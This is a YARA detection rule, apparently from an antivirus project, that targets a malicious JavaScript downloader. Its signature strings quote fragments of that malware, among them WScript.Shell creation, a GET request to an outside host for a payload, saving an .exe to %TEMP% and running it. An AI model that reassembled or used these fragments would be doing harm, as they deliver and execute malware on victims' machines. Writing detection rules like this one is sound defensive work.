rule sig_20160328_bde6efce4310ff6de69a5371da6df0b8 {
  meta:
    description = "datamaliciousorder - file 20160328_bde6efce4310ff6de69a5371da6df0b8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "68c5fdce5cfdb55050e33f9d8dc729a28395134d27e2584890a30b56a07f5c85"

  strings:
    $s1  = "function Alitfikuw() {return Wrpqyy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"3MFwdwrDrl.exe\";};" fullword ascii
    $s2  = "do {WScript[Deorhuoz](Liele() * 11)} while (Zntnvg[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Wrpqyy = function Okxksfprfd() {return WScript[Mfqqcus](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Bmirswlad(Pbugaxxjg, Isohqd){return Pbugaxxjg - Isohqd;};" fullword ascii
    $s5  = "Zntnvg[Ggvoddexa](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s6  = "function Cxxiextfw() {return ((Tlwesuwqgn == true) && (Tlwesuwqgn == Cmtjpgyf)) ? 1 : Qgbgxpskb;};" fullword ascii
    $s7  = "function Nkfbwra(Zoqrplqybr){Wrpqyy[\"Run\"](Zoqrplqybr, Qgbgxpskb, Qgbgxpskb);};" fullword ascii
    $s8  = "function Wqhpov(){return Mfqqcus;};" fullword ascii
    $s9  = "function Liele(){return 22;};" fullword ascii
    $s10 = "function Dcmincd()" fullword ascii
    $s11 = "var Cmtjpgyf = false;" fullword ascii
    $s12 = "var Tlwesuwqgn = false;" fullword ascii
    $s13 = "Cmtjpgyf = true; " fullword ascii
    $s14 = "function Echxmxdjbd(){return Qghebdsay;};" fullword ascii
    $s15 = " while (Wgbfdpg){" fullword ascii
    $s16 = "var Zxsvojoho = new this[\"Date\"]();" fullword ascii
    $s17 = "function Wpkni(Cwjdbhgam) {var Gstkmsvrcr = (1, 2, 3, 4, 5, Cwjdbhgam); return Gstkmsvrcr;};" fullword ascii
    $s18 = "return Bmirswlad(Gxqdcrf, Vmrvrmdrsg);" fullword ascii
    $s19 = "Tlwesuwqgn = true; " fullword ascii
    $s20 = "var Vnlnmmasko = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}